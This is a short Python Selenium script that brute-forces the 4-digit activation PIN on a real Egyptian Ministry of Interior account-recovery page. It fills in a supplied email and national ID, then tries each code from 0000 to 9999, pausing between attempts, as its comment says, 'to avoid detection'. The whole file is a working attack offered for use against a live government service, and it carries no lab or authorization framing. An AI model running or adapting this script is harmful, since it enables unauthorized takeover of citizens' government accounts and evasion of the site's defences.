from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Set up Chrome WebDriver
options = Options()
service = Service("./chromedriver")
driver = webdriver.Chrome(service=service, options=options)

# Open the target page
driver.get("https://moi.gov.eg/Account/ForgotActivationCode")

# User credentials
Mail = "Enter your email here"
ID = "Enter your national ID here"

# Wait and find input fields
email_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, "#Email")))
email_input.send_keys(Mail)

id_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, "#Identity")))
id_input.send_keys(ID)

# CSS selectors for required elements
pin_code_input_selector = "#PinCode"
close_modal_selector = "#CodeModal > div.modal-body > div > i"
check_button_selector = "#ActivationForm > div:nth-child(5) > button"

def try_codes():
    """Attempts all possible 4-digit PIN codes from 0000 to 9999."""
    pin_code_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, pin_code_input_selector)))

    for code in range(10000):  # Generates numbers from 0000 to 9999
        formatted_code = f"{code:04d}"  # Format as four-digit string (e.g., 0001)

        pin_code_input.click()
        pin_code_input.send_keys(formatted_code)

        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, close_modal_selector))).click()
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, check_button_selector))).click()

        time.sleep(1)  # Delay between attempts to avoid detection
        pin_code_input.clear()  # Clear input field for the next attempt

# Start trying the codes
try_codes()
